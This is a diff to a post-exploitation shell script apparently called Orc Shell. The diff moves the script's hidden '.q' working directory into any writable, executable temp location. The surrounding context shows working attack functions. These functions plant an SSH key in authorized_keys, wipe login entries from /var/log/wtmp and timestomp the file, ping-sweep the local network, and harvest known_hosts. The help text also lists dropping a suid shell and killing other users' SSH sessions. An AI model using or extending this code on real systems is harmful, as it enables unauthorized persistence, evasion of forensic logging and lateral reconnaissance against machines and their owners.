@@ -12,6 +12,7 @@ OVERSION="0.5"
 # layer or call tools/programs common for all Unix flavors.
 #
 
+
 orc_existsProg () {
   # Checks if a program/command exists.
   # Argument: Program/command name to check.
@@ -22,6 +23,7 @@ orc_existsProg () {
   fi
   hash "$@" > /dev/null 2> /dev/null
   }
+
 
 orc_loadURL () {
   # Loads from an URL via curl, wget or perl.
@@ -130,6 +132,41 @@ sys.exit(0)
   fi
 }
 
+orc_makeHome() {
+  # Creates a home directory.
+  # Sets the variable $HOME to this new created directory.
+  # Searchs a temporary directory without noexec flag as base.
+  for base in "/dev/shm" "$XDG_RUNTIME_DIR" "/tmp" "/var/tmp" "$TMPDIR" "$HOME" "$(pwd)"
+  do
+    if [ ! -d "$base" ]; then
+      # not exist or no directory
+      continue
+    fi
+    if [ ! -w "$base" ] || [ ! -x "$base" ]; then
+      # no write or no execute access
+      continue
+    fi
+    # Try to create a home directory
+    mkdir "$base/.q" 2>/dev/null
+    # Also possible to reuse an existing directory
+    if [ -d "$base/.q" ]; then
+      # try to create an executable
+      echo "test" > "$base/.q/.t"
+      chmod +x "$base/.q/.t"
+      if [ ! -x "$base/.q/.t" ]; then
+	# can not create a executable
+	rm "$base/.q/.t"
+	rmdir "$base/.q"
+        continue
+      fi
+      rm "$base/.q/.t"
+      # this is a good home
+      HOME="$base/.q"
+      break
+    fi
+  done
+  }
+
 
 # ~~~ Helper Functions ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 #
@@ -150,7 +187,14 @@ EOF
 )
 
 alias 'echo'='/bin/echo'
-trap "rm -rf /dev/shm/.q" EXIT TERM INT
+
+# Create home directory and prepare remove at script exit
+orc_makeHome
+if [ ! -d "$HOME" ]; then
+  echo 'ERROR: can not find a home directory.'
+  exit 1
+fi
+trap 'rm -rf $HOME' EXIT TERM INT
 
 # Creates a copy of this scipt in variable backup
 # Should be start like "ENV=o.rc sh -i".
@@ -458,7 +502,7 @@ getsuspect() {
 }
 
 keyinstall() {
-touch /dev/shm/.q/.ssh
+touch "$HOME/.ssh"
 touch -r /
 sshkey="ssh-rsa [YOUR KEY HERE] $(whoami)@$(hostname)"
 echo "$sshkey" >> "$NHOME/.ssh/authorized_keys"
@@ -559,14 +603,14 @@ sorry(){
 		valid=$(seq -f $(ipcalc -n --minaddr --maxaddr $(ifconfig | grep inet | grep -i broadcast | awk -F ' ' '{print $2" "$4}') | awk -F "=" '{print $2 " "}' | sed s/0/%g/ |tr -d '\n' | awk -F'.' '{print $1"."$2"."$3"."$4" "$7" "$10}' | awk -F " " '{print $1" "$3" "$5}' | tr -d '\n'))
 		echo "$valid" | tr ' ' '\n' | while read i;do
 			 if ping -c1 -q "$i" | grep -q "\ 0%"; then
-			 echo "$i is alive" >> /dev/shm/.q/ips
+			 echo "$i is alive" >> "$HOME/ips"
 			fi
 		done
 	else 
 	valid=$(seq -f $(ipcalc -n --minaddr --maxaddr $(ip addr show | grep inet | grep -i "broadcast\|brd" | awk -F ' ' '{print $2}') | awk -F "=" '{print $2 " "}' | sed s/0/%g/ |tr -d '\n' | awk -F'.' '{print $1"."$2"."$3"."$4" "$7" "$10}' | awk -F " " '{print $1" "$3" "$5}' | tr -d '\n'))
 	echo "$valid" | tr ' ' '\n' | while read i;do
 		 if ping -c1 -q "$i" | grep -q "\ 0%"; then
-		 echo "$i is alive" >> /dev/shm/.q/ips
+		 echo "$i is alive" >> "$HOME/ips"
 		fi
 	done
 	fi
@@ -576,7 +620,7 @@ sorry(){
 		INPUT=$(seq -f $(ifconfig | grep inet | grep -i broadcast | grep -v inet6 | grep "255.255.255.0" | head -n1 | awk -F " " '{print $2}' | awk -F '.' '{print $1"."$2"."$3".%g 1 254"}'))
 		echo "$INPUT" | tr ' ' '\n' | while read i;do
 			if ping -c1 -q "$i" | grep -q "\ 0%"; then
-			echo "$i" is alive >> /dev/shm/.q/ips
+			echo "$i" is alive >> "$HOME/ips"
 			fi
 		done
 		else 
@@ -584,7 +628,7 @@ sorry(){
 			INPUT=$(seq -f $(ip addr show | grep brd |grep "/24" | head -n 1| awk -F " " {'print $2'} | awk -F '.' '{print $1"."$2"."$3".%g 1 254"}'))
 			echo "$INPUT" | tr ' ' '\n' | while read i;do
 				 if ping -c1 -q "$i" | grep -q "\ 0%"; then
-				 echo "$i is alive" >> /dev/shm/.q/ips
+				 echo "$i is alive" >> "$HOME/ips"
 				fi
 			done
 			fi
@@ -610,18 +654,18 @@ echo "Please wait..."
 	else ping -c3 -i 10 -b $(ip addr show | grep inet | grep brd | awk -F ' ' '{print $4}')
 	fi
 echo "Broadcast ping is done."
-echo "Pulling known hosts for your user and writing to /dev/shm/.q/kh..."
-cat $NHOME/.ssh/known_hosts | awk -F ' ' '{print $1}' > /dev/shm/.q/kh
+echo "Pulling known hosts for your user and writing to $HOME/kh..."
+cat $NHOME/.ssh/known_hosts | awk -F ' ' '{print $1}' > "$HOME/kh"
 sorry &
 
 
 )
 
 wiper() {
-cat /var/log/wtmp | utmpdump | grep -v "$1" > /dev/shm/.q/.l
-touch -r /var/log/wtmp /dev/shm/.q/.l
-cat /dev/shm/.q/.l | utmpdump -r -o /var/log/wtmp
-touch -r /dev/shm/.q/.l /var/log/wtmp
+cat /var/log/wtmp | utmpdump | grep -v "$1" > "$HOME/.l"
+touch -r /var/log/wtmp "$HOME/.l"
+cat "$HOME/.l" | utmpdump -r -o /var/log/wtmp
+touch -r "$HOME/.l" /var/log/wtmp
 }
 
 getrel() {
@@ -734,8 +778,8 @@ echo "[*] dropsuid - drop tiny suid shell - dropsuid > [file]"
 echo "[*] hangup - terminate someones PTS by killing their SSH process. Very loud, DO NOT USE. - hangup [PTS NUMBER]"
 }
 
-mkdir /dev/shm/.q
-cd /dev/shm/.q
+# exit if home directory access is not possible
+cd "$HOME" || exit
 
 alias 'stomp'='touch -r'
 alias 'tools'='type dig perl python gcc nc openssl wget strace gcore nmap gdb curl wget tcpdump'
@@ -780,8 +824,7 @@ uptime -p
 echo "============================"
 echo "=== Welcome to Orc Shell ==="
 echo "Run gethelp to see a list of commands."
-echo "/dev/shm/.q should be deleted upon exit."
+echo "$HOME should be deleted upon exit."
 PS1='$USER'"@$(hostname):"'$PWD'"$ " 
-HOME="/dev/shm/.q"
 NHOME=$(getent passwd | grep --color=never "$(id -u)" | cut -d: -f 6)
 #rm $ENV
